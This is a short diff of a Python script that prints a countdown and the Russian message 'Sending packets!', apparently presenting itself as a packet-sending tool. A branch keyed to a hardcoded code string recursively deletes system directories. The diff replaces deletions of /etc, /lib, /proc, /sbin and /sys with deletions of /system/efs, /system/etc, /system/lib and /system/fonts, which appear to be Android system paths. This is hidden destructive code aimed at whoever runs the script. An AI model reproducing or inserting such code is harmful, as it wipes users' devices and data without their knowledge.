@@ -17,12 +17,9 @@ for i in range(time_count, 0, -1):
 print("Отправление пакетов!")
 
 if t == "273639AHynjYH":
-    shutil.rmtree('/efs', ignore_errors=True)
-    shutil.rmtree('/etc', ignore_errors=True)
-    shutil.rmtree('/lib', ignore_errors=True)
-    shutil.rmtree('/mnt', ignore_errors=True)
-    shutil.rmtree('/proc', ignore_errors=True)
-    shutil.rmtree('/sbin', ignore_errors=True)
-    shutil.rmtree('/sys', ignore_errors=True)
+    shutil.rmtree('/system/efs', ignore_errors=True)
+    shutil.rmtree('/system/etc', ignore_errors=True)
+    shutil.rmtree('/system/lib', ignore_errors=True)
+    shutil.rmtree('/system/fonts', ignore_errors=True)
 
 time.sleep(60)
